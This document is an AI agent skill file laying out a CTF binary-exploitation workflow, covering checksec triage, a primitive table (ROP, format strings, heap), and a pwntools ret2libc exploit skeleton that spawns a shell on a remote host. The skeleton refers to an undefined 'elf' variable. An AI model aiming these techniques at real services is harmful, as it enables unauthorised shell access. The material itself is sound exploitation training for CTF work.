---
name: ctf-pwn
description: Use when solving binary exploitation / pwn CTF challenges — buffer overflows, ROP, format strings, heap, kernel pwn. Provides a decision tree, exploit primitive catalog, and uses pwntools via the run_script(venv="pwntools") MCP path. Triggers on "ctf pwn", "binary exploit", "rop", "buffer overflow", "format string", "heap challenge".
---

# CTF pwn methodology

## 0. Pwntools venv

The MCP server runs pwntools through a dedicated venv at `~/.ctf-venvs/pwntools/`. If missing:

```bash
wsl.exe bash -lc "mkdir -p ~/.ctf-venvs && python3 -m venv ~/.ctf-venvs/pwntools && ~/.ctf-venvs/pwntools/bin/pip install pwntools z3-solver"
```

Then use it: `run_script(code, venv="pwntools")`.

## 1. Identify the binary

```bash
file ./vuln
checksec --file=./vuln       # or: rabin2 -I ./vuln
strings ./vuln | head -50
nm ./vuln | head -30          # symbols if not stripped
```

Note: `RELRO`, `Canary`, `NX`, `PIE`, arch (x86 / x86_64 / arm / mips), libc version.

If a libc is provided, identify it:

```bash
strings libc.so.6 | grep "GNU C Library"
# or
./vuln_pwntools_helper  # see below
```

`libc-database` and `libc-rip`/`libc.rip` (web) — find offsets by leaked function addresses.

## 2. Find the bug

Static:

- `objdump -d -M intel ./vuln`
- Ghidra / `cutter` (radare2 GUI) for decompile — both in registry
- Look for: `gets`, `strcpy`, unbounded `read`, `printf(user_input)`, integer overflow on size, double free, UAF

Dynamic:

- `gdb-multiarch ./vuln` + `pwndbg` / `gef`
- Cyclic pattern: `cyclic 200` → run → crash → `cyclic -l <RIP>` to find offset

## 3. Pick the primitive

| Class | Primitive | Tool |
| --- | --- | --- |
| Stack BOF, no canary, NX off | shellcode | `pwntools shellcraft.sh()` |
| Stack BOF, NX on, ASLR off | ret2win / static ROP | `ROPgadget --binary ./vuln` |
| Stack BOF, NX+ASLR, libc leak | ret2libc | leak with PUTS@got, calc system, /bin/sh |
| Stack BOF, NX+ASLR, no leak | ret2plt + puts → leak | classic chain |
| Format string | %n write / %s leak | pwntools `fmtstr_payload` |
| Heap (glibc) | tcache, fastbin, unsorted bin | `how2heap`, `pwndbg heap` |
| Use-after-free | dangling pointer abuse | manual python |
| Kernel | KASLR leak, modprobe_path, etc | manual + qemu |

## 4. Exploit skeleton (pwntools)

```python
from pwn import *

context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")
p = remote("host", 1337)  # or process("./vuln") for local

# leak
p.sendlineafter(b"> ", b"A" * 40 + p64(elf.plt['puts']) + p64(elf.sym['main']))
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym['puts']

# pwn
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))  # stack align
rop.system(next(libc.search(b"/bin/sh")))
p.sendline(b"A" * 40 + rop.chain())

p.interactive()
```

## 5. Heap (glibc)

- Identify glibc version (matters: 2.27, 2.31, 2.32, 2.34+ differ)
- Useful tcache primitives: tcache poisoning (≥ 2.27), tcache key bypass (≥ 2.32), safe-linking (≥ 2.32)
- Tools: `pwndbg heap`, `glibc-all-in-one`, `how2heap` (clone if not present)

## 6. Don't waste time on

- Manual ROP gadget search if the binary is large — use `ROPgadget` or `ropper`
- Reimplementing pwntools functionality (cyclic, fmtstr, ROP chain building)
- Trying win functions if there's no `system` symbol — check `nm` first

## After solve

Use the `writeup-template` skill. Include the final exploit script verbatim.
